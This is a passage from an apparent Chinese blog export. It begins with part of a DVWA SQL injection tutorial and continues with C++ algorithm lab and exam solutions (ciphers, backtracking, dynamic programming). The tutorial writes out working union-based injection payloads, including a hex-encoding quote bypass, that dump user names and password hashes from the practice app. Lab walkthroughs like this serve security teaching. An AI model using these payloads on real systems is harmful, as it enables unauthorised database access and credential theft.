获取表中的字段名输入1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; #，查询成功： #是注释作用 MQlbm6.png 圈起来是是字段名 下载数据输入1&#39; or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功： #是注释作用 MQ1ncn.png 这样就得到了users表中所有用户的user_id,first_name,last_name,password的数据。 级别：medium分析 Medium级别的代码利用mysql_real_escape_string函数对特殊符号\x00,\n,\r,,’,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。 虽然前端使用了下拉选择菜单，但我们依然可以通过抓包改参数，提交恶意构造的查询参数。 判断是否存在注入，注入是字符型还是数字型 抓包更改参数id为1&#39; or 1=1 # 报错： #是注释作用 MlNW38.png MlNhjg.png MlNIBj.png 抓包更改参数id为1 or 1=1 #，查询成功： MlUEvD.png 说明存在数字型注入。 由于是数字型注入，服务器端的mysql_real_escape_string函数就形同虚设了，因为数字型注入并不需要借助引号。 猜解SQL查询语句中的字段数抓包更改参数id为1 order by 2 #，查询成功： MlwIzV.png 抓包更改参数id为1 order by 3 #，报错： MlwLdJ.png 说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。 确定显示的字段顺序 抓包更改参数id为1 union select 1,2 #，查询成功： Ml0JWq.png 说明执行的SQL语句为select First name,Surname from 表 where ID=id… 获取当前数据库 抓包更改参数id为1 union select 1,database() #，查询成功： Ml0j0g.png 说明当前的数据库为dvwa。 获取数据库中的表抓包更改参数id为1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，查询成功： MlBK91.png 说明数据库dvwa中一共有两个表，guestbook与users。 获取表中的字段名抓包更改参数id为1 union select 1,group_concat(column_name) from information_schema.columns where table_name=’users ’#，查询失败： Mls0jx.png 这是因为单引号被转义了，变成了\’。可以利用16进制进行绕过 ‘’ 抓包更改参数id为1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 #，查询成功： 说明users表中有8个字段，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login。 下载数据抓包修改参数id为1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功： MlraOf.png 级别：highSQL Injection Source&lt;?php if( isset( $_SESSION [ &#39;id&#39; ] ) ) { // Get input $id = $_SESSION[ &#39;id&#39; ]; // Check database $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39; LIMIT 1;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#39;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#39; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) { // Get values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; 分析： 与Medium级别的代码相比，High级别的只是在SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。 漏洞利用: 虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。由于手工注入的过程与Low级别基本一样，直接最后一步演示下载数据。 输入1&#39; or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功： M3q1r6.png 特别注意：High级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的sqlmap注入，因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。 参考链接： https://www.jianshu.com/p/e51cd8f15a84 🚩推荐阅读DVWA-SQL_Injection_Blind（sql盲注）利用sqlmap注入dvwa简单sql注入环境搭建及注入我的WafBypass之道 三篇笔记SQL注入脚本练习]]></content>
      <categories>
        <category>sql注入</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法实验考试]]></title>
    <url>%2F2019%2F10%2F28%2F%E7%AE%97%E6%B3%95%E5%AE%9E%E9%AA%8C%E8%80%83%E8%AF%95%2F</url>
    <content type="text"><![CDATA[算法实验上机考试 问题 A: 进制转换题目描述给定一个十进制正整数N，请将其转换为十六进制并输出。 输入一个十进制正整数N。( 1 &lt;= N &lt;= 2×109 ) 输出输出N对应的十六进制，用数字 0~9 以及大写字母 A~F 来表示。 样例输入2019 样例输出7E3 提示递归 代码#include&lt;bits/stdc++.h&gt; using namespace std; char *t=&quot;0123456789ABCDEF&quot;; void f(int n) { if(n&gt;0) { f(n/16); cout&lt;&lt;t[n%16]; } } int main() { int m; cin&gt;&gt;m; f(m); cout&lt;&lt;endl; } 问题 B: 背包问题题目描述在N件物品取出若干件放在容量为W的背包里，每件物品的体积为W1，W2……Wn（Wi为整数），与之相对应的价值为P1,P2……Pn（Pi为整数）。求背包能够容纳的最大价值。 输入第1行，2个整数，N和W中间用空格隔开。N为物品的数量，W为背包的容量。(1 &lt;= N &lt;= 1000，1 &lt;= W &lt;= 105)第2 ~ N+1行，每行2个整数，Wi和Pi，分别是物品的体积和物品的价值。(1 &lt;= Wi &lt;= 105，1 &lt;= Pi &lt;= 2×109) 输出输出可以容纳的最大价值。 样例输入3 6 2 5 3 8 4 9 样例输出14 提示肯定是递归做，但是dp数组用二维的不知道为什么总是数组超限，考完和同学交流了一下，发现不是个例，考试的时候我还提交了一维的写法，但是时间又超限了，时间卡在1040，差40就可以过了，但是我交了30多遍也没用，代码就不贴出来了（我还是太弱了）。 问题 C: 迷宫问题题目描述给定一个N行M列的迷宫，其中’.’代表空地，可以通行；’#’代表障碍物，无法通行；’S’代表起点；’T’代表终点；’’S’和’T’这两个位置也是空地，可以通行。在迷宫中可以向上、下、左、右四个不同的方向行走，请你判断从起点出发是否可以走到终点？如果可以，请你计算到达终点最少需要走几步。 输入第1行，2个整数，N和M，中间用空格隔开。N为迷宫的行，M为迷宫的列。(2 &lt;= N,M &lt;= 1000)第2 ~ N+1行，每行M个字符，对应整个迷宫的布局，输入数据中保证只有’.’,’#’,’S’,’T’这四种字符，并且只有一个’S’，只有一个’T’。 输出如果可以到达终点，输出两行，第一行输出”YES”，第二行输出一个整数代表最少需要走几步。如果无法到达终点，输出”NO”。 样例输入4 9 #S#.#.#T# #....##.# #.##....# #....#### 样例输出YES 10 提示回溯，但是考试前觉得不会考，也没怎么看，拿到手有思路，就是没写出来（话说好像和数据结构实验的最后一题差不多） 问题 D: 素数问题题目描述葬爱家族的Halobin近在研究素数，他想知道对于两个整数x和y（x&gt;y），能否找到若干个素数p1,p2,…pk，使得x=y+p1+p2+…+pk。注意素数可以无限重复使用，例如x=9,y=1，那么只需要用4个2就可以了，即9=1+2+2+2+2. 请你帮他解决这个问题。 输入第一行输入数据组数T(T&lt;100) 接下来T行每行输入两个整数x和y（0]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法实验作业]]></title>
    <url>%2F2019%2F10%2F26%2F%E7%AE%97%E6%B3%95%E5%AE%9E%E9%AA%8C%E4%BD%9C%E4%B8%9A%2F</url>
    <content type="text"><![CDATA[算法作业。 问题 A: 凯撒加密法题目描述​ 凯撒加密法，或称恺撒加密、恺撒变换、变换加密，是一种最简单且最广为人知的加密技术。它是一种替换加密的技术，明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。​ 例如，当偏移量是左移3的时候：明文字母表：ABCDEFGHIJKLMNOPQRSTUVWXYZ密文字母表：DEFGHIJKLMNOPQRSTUVWXYZABC使用时，加密者查找明文字母表中需要加密的消息中的每一个字母所在位置，并且写下密文字母表中对应的字母。需要解密的人则根据事先已知的密钥反过来操作，得到原来的明文。例如：​ 明文：THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG​ 密文：WKH TXLFN EURZQ IRA MXPSV RYHU WKH ODCB GRJ​ 现在给定你一个字符串S（长度不会超过1000000）和一个整数k（-1000000000&lt;=k&lt;=1000000000），分别代表接受者收到的密文和在加密该密文时向后的偏移量，你的任务是计算出原来的明文​ 注意：只有字母在加密时才会发生偏移，其它字符保持不变 输入​ 输入包含多组数据，其中第一行为数据组数T（T&lt;=10）​ 每组数据第一行为一个字符串S，由数字、字母以及常见字符组成（不含空格），第二行为一个整数k代表加密时向后的偏移量（|S|&lt;=1000000,-1000000000&lt;=k&lt;=1000000000） 输出​ 对每组数据，输出一行字符串，代表输入中的密文对应的明文。 样例输入1 DEFGHIJKLMNOPQRSTUVWXYZABC 3 样例输出ABCDEFGHIJKLMNOPQRSTUVWXYZ 提示代码#include&lt;bits/stdc++.h&gt; using namespace std; int main() { int t; cin&gt;&gt;t; while(t--) { int k; string s; cin&gt;&gt;s; cin&gt;&gt;k; k=k%26; int len=s.length(); for(int i=0;i&lt;len;i++) { if(s[i]&gt;=&#39;A&#39;&amp;&amp;s[i]&lt;=&#39;Z&#39;) { s[i]=s[i]-k; if(s[i]&lt;&#39;A&#39;) { s[i]=s[i]+26; } if(s[i]&gt;&#39;Z&#39;) { s[i]=s[i]-26; } } if(s[i]&gt;=&#39;a&#39;&amp;&amp;s[i]&lt;=&#39;z&#39;) { s[i]=s[i]-k; if(s[i]&lt;&#39;a&#39;) { s[i]=s[i]+26; } if(s[i]&gt;&#39;z&#39;) { s[i]=s[i]-26; } } } cout&lt;&lt;s&lt;&lt;endl; } } 问题 B: Vigenère 密码题目描述16 世纪法国外交家 Blaise de Vigenère 设计了一种多表密码加密算法——Vigenère 密码。Vigenère 密码的加密解密算法简单易用，且破译难度比较高，曾在美国南北战争中为南军所广泛使用。 在密码学中，我们称需要加密的信息为明文，用 MM 表示；称加密后的信息为密文，用 CC 表示；而密钥是一种参数，是将明文转换为密文或将密文转换为明文的算法中输入的数据，记为 kk。 在 Vigenère 密码中，密钥 kk 是一个字母串，k=k1k2…kn。当明文 M = m1m2…mn 时，得到的密文 C = c1c2…cn ，其中 ci = mi ® ki，运算 ® 的规则如下表所示： img Vigenère 加密在操作时需要注意： ® 运算忽略参与运算的字母的大小写，并保持字母在明文 MM 中的大小写形式； 当明文 MM 的长度大于密钥 kk 的长度时，将密钥 kk 重复使用。 例如，明文 M=M=Helloworld，密钥 k=k=abc时，密文 C=C=Hfnlpyosnd。 img 输入第一行为一个字符串，表示密钥 kk，长度不超过 100100，其中仅包含大小写字母。 第二行为一个字符串，表示经加密后的密文，长度不超过 10001000，其中仅包含大小写字母。 输出输出共 11 行，一个字符串，表示输入密钥和密文所对应的明文。 样例输入CompleteVictory Yvqgpxaimmklongnzfwpvxmniytm 样例输出Wherethereisawillthereisaway 提示代码#include &lt;bits/stdc++.h&gt; using namespace std; int main() { char k[102],c[1002]; int i,j; char temp; cin&gt;&gt;k; cin&gt;&gt;c; for(i=0,j=0;c[j]!=&#39;\0&#39;;j++) { if(c[j]&gt;=&#39;A&#39;&amp;&amp;c[j]&lt;=&#39;Z&#39;) { if(k[i]&gt;=&#39;A&#39;&amp;&amp;k[i]&lt;=&#39;Z&#39;) temp=(c[j]-&#39;A&#39;-(k[i]-&#39;A&#39;)+26)%26+&#39;A&#39;; else temp=(c[j]-&#39;A&#39;-(k[i]-&#39;a&#39;)+26)%26+&#39;A&#39;; } else { if(k[i]&gt;=&#39;A&#39;&amp;&amp;k[i]&lt;=&#39;Z&#39;) temp=(c[j]-&#39;a&#39;-(k[i]-&#39;A&#39;)+26)%26+&#39;a&#39;; else temp=(c[j]-&#39;a&#39;-(k[i]-&#39;a&#39;)+26)%26+&#39;a&#39;; } cout&lt;&lt;temp; i++; if(k[i]==&#39;\0&#39;) i=0; } return 0; } 问题 C: 简单的密码题目描述密码是按特定法则编成，用以对通信双方的信息进行明密变换的符号。密码是隐蔽了真实内容的符号序列。其实就是把用公开的、标准的信息编码表示的信息通过一种变换手段，将其变为除通信双方以外其他人所不能读懂的信息编码，这种独特的信息编码就是密码。现在我们定义一种非常简单的密码，它的长度固定为n（n&lt;=30）并且每一位只能由数字0或者数字1组成，但是有一个特殊的要求：一个密码序列中至少要有连续的3个0出现才可以，否则就是无效的。现在给定你密码序列的长度n，你的任务是计算长度为n的序列能产生多少种不同的并且有效的密码？ 输入输入包含多组数据，每组数据只有一个正整数n（1&lt;=n&lt;=30）代表密码序列的长度，单独占一行。 输出对每组数据，输出一个整数，代表长度为n的序列能产生的不同密码的种类数。 样例输入4 5 6 样例输出3 8 20 提示代码#include&lt;bits/stdc++.h&gt; using namespace std; int dp[32] = {0,0,0,1,3,8,20,47,107,238,520,1121,2391,5056,10616,22159,46023,95182,196132,402873,825259,1686408,3438828,6999071,14221459,28853662,58462800,118315137,239186031,483072832,974791728}; int main() { int n; while(cin&gt;&gt;n) { cout&lt;&lt;dp[n]&lt;&lt;endl; } return 0; } 问题 D: 有趣的素数题目描述素数被广泛地应用于密码学中，所谓的公钥就是将想要传递的信息在编码时加入砠数，编码之后传给收信人，任何人收到此信息之后，若没有此收信人所拥有的秘钥，则在解密的过程中将会因为分解质因数过久而无法破解信息，可见素数在密码学中的重要性。现在给你n（2&lt;=n&lt;=16）个正整数1,2,3…n，你的任务是把这n个正整数组成一个环，使得任意相邻的两个整数之和为一个素数，输出有多少种合法方案。 输入多组输入数据，每组数据只有一个正整数n（2&lt;=n&lt;=16）代表有n个正整数 1,2,3…n 输出对每组数据，输出一个整数，代表有多少种不同的可行方案数。 样例输入6 8 样例输出2 4 提示对于输入样例中的6，有以下2种合法方案（首尾相连构成一个环） 1 4 3 2 5 6 1 6 5 2 3 4 对于输入样例中的8，有以下4种合法方案（首尾相连构成一个环） 1 2 3 8 5 6 7 4 1 2 5 8 3 4 7 6 1 4 7 6 5 8 3 2 1 6 7 4 3 8 5 2 代码#include&lt;bits/stdc++.h&gt; using namespace std; int n,ans,last; bool visited[32]; bool isPrime[40]={0,0,1,1,0,1,0,1,0,0,0,1,0,1,0,0,0,1,0,1,0,0,0,1,0,0,0,0,0,1,0,1,0,0,0,0,0,1,0,0}; void pc(int cur) { if(cur == n &amp;&amp; isPrime[1+last]) { ans++; return; } for(int i = 2; i &lt;= n; i++) { if(!visited[i] &amp;&amp; isPrime[last+i]) { int t = last; last = i; visited[i] = true; pc(cur+1); visited[i] = false; last = t; } } } int main() { while(cin&gt;&gt;n) { memset(visited,0,sizeof(visited)); ans = 0; last = 1; pc(1); cout&lt;&lt;ans&lt;&lt;endl; } return 0; } 问题 E: 数据加密题目描述密码学是研究编制密码和破译密码的技术科学。研究密码变化的客观规律，应用于编制密码以保守通信秘密的，称为编码学；应用于破译密码以获取通信情报的，称为破译学，总称密码学。密码是通信双方按约定的法则进行信息特殊变换的一种重要保密手段。依照这些法则，变明文为密文，称为加密变换；变密文为明文，称为脱密变换。密码在早期仅对文字或数码进行加、脱密变换，随着通信技术的发展，对语音、图像、数据等都可实施加、脱密变换。现在要求你用下面给定的方法对数据实现加密。给定长度为n的字符串S（1&lt;=n&lt;=2000,S中只有大写字母）作为明文，要求构造一个字符串T作为密文，起初T是一个空串，之后反复执行以下任意操作 1.从S的头部删除一个字符，加入到T的尾部2.从S的尾部删除一个字符，加入到T的尾部 最后S会变成空串，T会变成一个长度为n的字符串作为密文。当然并非所有的构造方案都是符合条件的，我们要求构造出的密文T的字典序尽可能小，你能找出这个字典序最小的密文吗？ 输入输入包含多组数据，每组数据占两行，第一行为一个整数n（1&lt;=n&lt;=2000）代表字符串S的长度，第二行为一个长度为n的字符串S代表明文，保证S中只有大写字母 输出对每组数据，输出一行字符串，代表构造出的字典序最小的密文T 样例输入6 ACDBCB 样例输出ABCBCD 提示字典序是指从前往后比较两个字符串大小的方法。首先比较第1个字符，如果不同则第1个字符更小的字符串更小，如果相同则继续比较第2个字符……如此继续，来比较整个字符串的大小 代码#include&lt;bits/stdc++.h&gt; using namespace std; int main() { int n; char str[2005],ans[2005]; while(cin&gt;&gt;n) { cin&gt;&gt;str; int i = 0,j = n-1; while(i &lt;= j) { bool flag = false; for(int k = 0; i+k &lt; j-k; k++) { if(str[i+k] &lt; str[j-k]) { flag = true; break; } if(str[i+k] &gt; str[j-k]) break; } if(flag) cout&lt;&lt;str[i++]; else cout&lt;&lt;str[j--]; } cout&lt;&lt;endl; } return 0; } 🚩推荐阅读算法实验考试算法实验（四）算法实验（三）python-algorithmpython必会算法推荐检查回文数]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法实验（四）]]></title>
    <url>%2F2019%2F10%2F25%2F%E7%AE%97%E6%B3%95%E5%AE%9E%E9%AA%8C4%2F</url>
    <content type="text"><![CDATA[算法实验四。 问题 A: 判断日期是否符合格式题目描述我们知道一年有12个月，每个月最多有31天，年有平年和闰年之分，本题目要求如果输入一个日期，程序需要判断用户输入的日期是否正确。 提示：测试输入的三个数字中，年份是正数，月份和日期有可能是负数，程序需要对这两个数为负数的情况进行判断。 输入多组测试用例，对每组测试用例： 用户输入是三个数字，分别表示年，月和日。 例如 2007 10 21 ，表示2007年10月21日，这个输入经过判断是正确的。又例如输入 1993 11 38 ，这个输入经过判断是错误的，因为日期不能超过31天。 输出程序的输出分为两种，1或者0。1表示输入正确，0表示输入错误。 样例输入2011 21 10 样例输出0 提示代码#include&lt;bits/stdc++.h&gt; using namespace std; int days[13] = {0,31,28,31,30,31,30,31,31,30,31,30,31}; bool isLeap(int y) { if(y%400 == 0) return true; if(y%4 == 0 &amp;&amp; y%100) return true; return false; } int main() { int y,m,d; while(cin&gt;&gt;y&gt;&gt;m&gt;&gt;d) { bool flag = isLeap(y); if(m &lt;= 0 || m &gt; 12 || d &lt;= 0) { cout&lt;&lt;&quot;0&quot;&lt;&lt;endl; continue; } int dd = days[m]; if(m == 2 &amp;&amp; flag) dd++; if(d &lt;= dd) { cout&lt;&lt;&quot;1&quot;&lt;&lt;endl; continue; } cout&lt;&lt;&quot;0&quot;&lt;&lt;endl; } return 0; } 问题 B: 哈夫曼编码题目描述给定一只含有小写字母的字符串；输出其哈夫曼编码的长度 输入第一行一个整数T，代表样例的个数，接下来T行，每行一个字符串，0&lt;T&lt;=2000,字符串长度0&lt;L&lt;=1500. 输出对于每个字符串，输出其哈夫曼编码长度 样例输入3 hrvsh lcxeasexdphiopd mntflolfbtbpplahqolqykrqdnwdoq 样例输出10 51 115 提示代码#include&lt;bits/stdc++.h&gt; using namespace std; const int maxn = 2000; int num[30],ans; struct cmp1 { bool operator()(int&amp; a,int&amp; b) { return a &gt; b; } }; int main() { int t; char str[maxn]; cin&gt;&gt;t; while(t--) { cin&gt;&gt;str; memset(num,0,sizeof(num)); int len = strlen(str); for(int i = 0; i &lt; len; i++) num[int(str[i]-&#39;a&#39;)]++; priority_queue&lt;int,vector&lt;int&gt;,cmp1&gt; pq; for(int i = 0; i &lt; 26; i++) if(num[i]) pq.push(num[i]); ans = 0; while(pq.size() &gt; 1) { int a,b; a = pq.top(); pq.pop(); b = pq.top(); pq.pop(); pq.push(a+b); ans += a+b; } cout&lt;&lt;ans&lt;&lt;endl; } return 0; } 问题 C: 2n皇后问题题目描述给定一个 n\n*的棋盘，棋盘中有一些位置不能放皇后。现在要向棋盘中放入 n 个黑皇后和 n个白皇后，使任意的两个黑皇后都不在同一行、同一列或同一条对角线上，任意的两个白皇后都不在同一行、同一列或同一条对角线上。问总共有多少种放法？n 小于等于 8。 输入 输入的第一行为一个整数 n，表示棋盘的大小。 ​ 接下来 n 行，每行 n 个 0 或 1 的整数，如果一个整数为1，表示对应的位置可以放皇后，如果一个整数为 0，表示对应的位置不可以放皇后。 输出输出一个整数，表示总共有多少种放法 样例输入4 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 样例输出2 提示代码#include&lt;bits/stdc++.h&gt; using namespace std; const int maxn = 10; int map_q[maxn][maxn]; int x1[maxn],x2[maxn],ans,n; bool check1(int xx,int yy) { if(!map_q[xx][yy]) return false; for(int i = 0; i &lt; xx; i++) { if(yy == x1[i]) return false; if(abs(xx - i) == abs(yy - x1[i])) return false; //斜对角 } return true; } bool check2(int xx,int yy) { if(!map_q[xx][yy]) return false; for(int i = 0; i &lt; xx; i++) { if(yy == x2[i]) return false; if(abs(xx - i) == abs(yy - x2[i])) return false; //斜对角 } return true; } void queen(int l) { if(l == n) { ans++; return; } for(int i = 0; i &lt; n; i++) { if(check1(l,i)) { x1[l] = i; map_q[l][i] = 0; for(int j = 0; j &lt; n; j++) { if(check2(l,j)) { x2[l] = j; queen(l+1); x2[l] = -1; } } map_q[l][i] = 1; x1[l] = -1; } } } int main() { cin&gt;&gt;n; for(int i = 0; i &lt; n; i++) { for(int j = 0; j &lt; n; j++) { cin&gt;&gt;map_q[i][j]; } } ans = 0; queen(0); cout&lt;&lt;ans&lt;&lt;endl; return 0; } 问题 D: 图的m着色问题题目描述给定无向连通图G和m种不同的颜色，用这些颜色给图的各个顶点着一种颜色，若某种方案使得图中每条边的2个顶点的颜色都不相同，则是一个满足的方案，找出所有的方案。 输入第一行有3个正整数n，k和m，分别表示n个顶点，k条边，m种颜色接下来k行，每行2个正整数，表示一条边的两个顶点 输出所有不同的着色方案数 样例输入5 8 4 1 2 1 3 1 4 2 3 2 4 2 5 3 4 4 5 样例输出48 提示代码#include&lt;bits/stdc++.h&gt; using namespace std; const int maxn = 2e3 + 5; int n,k,m,ans; int map_c[maxn][maxn]; int color[maxn]; void dfs(int d) { if(d == n+1) { ans++; return; } for(int i = 1; i &lt;= m; i++) //颜色m种 { bool flag = true; for(int j = 1; j &lt;= n; j++) //n个点 { if(map_c[d][j] &amp;&amp; color[j] == i) //连通且颜色为i则失败 { flag = false; break; } } if(flag) { color[d] = i; //染色 dfs(d+1); //下一结点 color[d] = 0; //回到未染色状态 } } } int main() { cin&gt;&gt;n&gt;&gt;k&gt;&gt;m; for(int i = 0; i &lt; k; i++) { int tmp1,tmp2; cin&gt;&gt;tmp1&gt;&gt;tmp2; map_c[tmp1][tmp2] = 1; map_c[tmp2][tmp1] = 1; } dfs(1); cout&lt;&lt;ans; return 0; } 问题 E: 部分和问题题目描述给定n个整数，判断是否可以从中选择若干数字，使得他们的和恰好为k。 输入多组测试用例。 对于每组测试用例，第一行一个正整数n，第二行n个整数，第三行一个整数k。 1≤N≤20，输入整数及k均小于1e8。 输出若可以使得和为k，输出”Yes”,否则”No”。 样例输入4 1 2 4 7 13 样例输出Yes 提示代码#include&lt;bits/stdc++.h&gt; using namespace std; const int maxn = 25; int n,a[maxn],k; bool dfs(int l,int sum) { if(sum == k) return true; if(l == n) return false; return dfs(l+1,sum)||dfs(l+1,sum+a[l]); } int main() { while(cin&gt;&gt;n) { for(int i = 0; i &lt; n; i++) cin&gt;&gt;a[i]; cin&gt;&gt;k; if(dfs(0,0)) cout&lt;&lt;&quot;Yes&quot;&lt;&lt;endl; else cout&lt;&lt;&quot;No&quot;&lt;&lt;endl; } return 0; } 🚩推荐阅读算法实验考试算法实验作业算法实验（三）python-algorithmpython必会算法推荐检查回文数]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法实验（三）]]></title>
    <url>%2F2019%2F10%2F24%2F%E7%AE%97%E6%B3%95%E5%AE%9E%E9%AA%8C3%2F</url>
    <content type="text"><![CDATA[算法实验三。 问题 A: 评分系统题目描述英语俱乐部举办了一个叫做“英文金曲大赛”的节目。这个节目有好多人参加，这不，成绩出来了，渊子当是很勇敢，自告奋勇接下了算出大家的总得分的任务。当时有7个评委，每个评委都要给选手打分，现在要求去掉一个最高分和去掉一个最低分，再算出平均分。结果精确到小数点后两位。 输入测试数据包括多个实例。每组数据包括7个实数，代表评委们对该选手的评分。紧接着是选手的名字，名字的长度不超过30个字符。输入直到文件结束。 输出输出每位选手名字和最终得分，结果保留两位有效数字。 样例输入10 10 10 10 10 10 9 xiaoyuanwang 0 0 0 0 0 0 0 beast 样例输出xiaoyuanwang 10.00 beast 0.00 提示代码#include&lt;bits/stdc++.h&gt; using namespace std; int main() { double a[7],sum=0; while(cin&gt;&gt;a[0]) { sum=a[0]; for(int i=1;i&lt;7;i++) { cin&gt;&gt;a[i]; sum+=a[i]; } sort(a,a+7); string s; cin&gt;&gt;s; cout&lt;&lt;s&lt;&lt;&quot; &quot;; sum=sum-a[0]-a[6]; sum=sum/5.0; cout&lt;&lt;setprecision(2)&lt;&lt;std::fixed&lt;&lt;sum&lt;&lt;endl; } } 问题 B: 节食的限制题目描述Bessie像她的诸多姊妹一样，因為从Farmer John的草地吃了太多美味的草而长出了太多的赘肉。所以FJ将她置於一个及其严格的节食计划之中。她每天不能吃多过H(5&lt;=H&lt;=45000)公斤的乾草。Bessie只能吃一整綑乾草；当她开始吃一綑乾草的之后就再也停不下来了。她有一个完整的N(1&lt;=n&lt;=50)綑可以给她当作晚餐的乾草的清单。她自然想要尽量吃到更多的乾草。很自然地，每綑乾草只能被吃一次（即使在列表中相同的重量可能出现2次，但是这表示的是两綑乾草，其中每綑乾草最多只能被吃掉一次）。 给定一个列表表示每綑乾草的重量Si(1&lt;=Si&lt;=H),求Bessie不超过节食的限制的前提下可以吃掉多少乾草（注意一旦她开始吃一綑乾草就会把那一綑乾草全部吃完）。 输入第一行：两个由空格隔开的整数：H和N， 第2到N+1行：第i+1行是一个单独的整数，表示第i綑乾草的重量Si。 输出一个单独的整数表示Bessie在限制范围内最多可以吃多少公斤的乾草。 样例输入56 4 15 19 20 21 样例输出56 提示代码#include&lt;bits/stdc++.h&gt; using namespace std; int dp[45001]; int main() { int h,z,a[501]; cin&gt;&gt;h&gt;&gt;z; for(int i=1;i&lt;=z;i++) cin&gt;&gt;a[i]; for(int i=1;i&lt;=z;i++) for(int j=h;j&gt;=a[i];j--) dp[j]=max(dp[j],dp[j-a[i]]+a[i]); cout&lt;&lt;dp[h]&lt;&lt;endl; return 0; } 问题 C: 汽车费用题目描述一个特别的单行街道在每公里处有一个汽车站。顾客根据他们乘坐汽车的公里使来付费。例如下表就是一个费用的单子。没有一辆车子行驶超过10公里，一个顾客打算行驶n公里(1&lt;=n&lt;100)，它可以通过无限次的换车来完成旅程。最后要求费用最少。 输入第一行十个整数分别表示行走1到10公里的费用(&lt;=500)。注意这些数并无实际的经济意义，即行驶10公里费用可能比行驶一公里少。第二行一个整数n表示，旅客的总路程数。 输出仅一个整数表示最少费用。 样例输入12 21 31 40 49 58 69 79 90 101 15 样例输出147 提示代码#include&lt;bits/stdc++.h&gt; using namespace std; const int inf=0x3f3f3f3f; int a[11],v[105]; int main() { for(int i=1;i&lt;=10;i++) { cin&gt;&gt;a[i]; } int n; cin&gt;&gt;n; for(int i=1;i&lt;105;i++) { v[i]=inf; } for(int i=1;i&lt;=n;i++) { for(int j=0;j&lt;=10;j++) { if(i&gt;=j) { v[i]=min(v[i],v[i-j]+a[j]); } } } cout&lt;&lt;v[n]&lt;&lt;endl; } 问题 D: 法师康的工人题目描述三个法师康的工人每天早上6点到工厂开始到三条产品生产线上组装桔子手机。第一个工人在200时刻开始（从6点开始计时，以秒作为单位）在生产线上开始生产，一直到1000时刻。第二个工人，在700时刻开始，在1100时刻结束。第三个工人从1500时刻工作到2100时刻。期间最长至少有一个工人在生产线上工作的连续时间为900秒（从200时刻到1100时刻），而最长的无人生产的连续时间（从生产开始到生产结束）为400时刻（1100时刻到1500时刻）。 你的任务是用一个程序衡量N个工人在N条产品线上的工作时间列表（1≤N≤5000，以秒为单位）。 ·最长的至少有一个工人在工作的时间段 ·最长的无人工作的时间段（从有人工作开始计） 输入输入第1行为一个整数N，第2-N+1行每行包括两个均小于1000000的非负整数数据，表示其中一个工人的生产开始时间与结束时间。 输出输出为一行，用空格分隔开两个我们所求的数。 样例输入3 200 1000 700 1100 1500 2100 样例输出900 400 提示代码#include&lt;bits/stdc++.h&gt; using namespace std; const int maxn = 5005; struct node { int b,e; bool operator &lt; (const node&amp; c) const { return b &lt; c.b; } }a[maxn]; int main() { int n,ans1,ans2; cin&gt;&gt;n; for(int i = 0; i &lt; n; i++) { cin&gt;&gt;a[i].b&gt;&gt;a[i].e; } sort(a,a+n); ans1 = a[0].e - a[0].b; ans2 = 0; int j = 0; for(int i = 1; i &lt; n; i++) { if(a[i].b &lt;= a[j].e) //如果交叉或相切 { a[j].e = max(a[i].e,a[j].e); ans1 = max(ans1,a[j].e-a[j].b); } else { ans2 = max(ans2,a[i].b-a[j].e); j = i; } } cout&lt;&lt;ans1&lt;&lt;&quot; &quot;&lt;&lt;ans2&lt;&lt;endl; return 0; } 问题 E: 配对元素题目描述给出2个序列A={a[1]，a[2]，…，a[n]}，B={b[1]，b[2]，…，b[n]}，从A、B中各选出n个元素进行一一配对（可以不按照原来在序列中的顺序），并使得所有配对元素差的绝对值之和最大。 输入输入的第1行为1个整数n 第2行包含n个整数，题目中的A序列。 第3行包含n个整数，题目中的B序列。 输出一个数，最大配对 3与6配对，2与7配对，5与4配对，6与1配对，绝对值之差和为14 对于10%的数据，有n≤20； 对于30%的数据，有n≤100； 对于50%的数据，有n≤1000； 对于100%的数据，有n≤10000；a[i]，b[i]≤1000。 样例输入4 2 5 6 3 1 4 6 7 样例输出14 提示代码#include&lt;bits/stdc++.h&gt; using namespace std; int main() { int n; cin&gt;&gt;n; int a[n],b[n]; for(int i=0;i&lt;n;i++) { cin&gt;&gt;a[i]&gt;&gt;b[i]; } sort(a,a+n); sort(b,b+n); int sum=0; for(int i=0;i&lt;n;i++) { sum=sum+abs(a[i]-b[n-1-i]); } cout&lt;&lt;sum&lt;&lt;endl; } 🚩推荐阅读算法实验考试算法实验作业算法实验（四）python-algorithmpython必会算法推荐检查回文数]]></content>
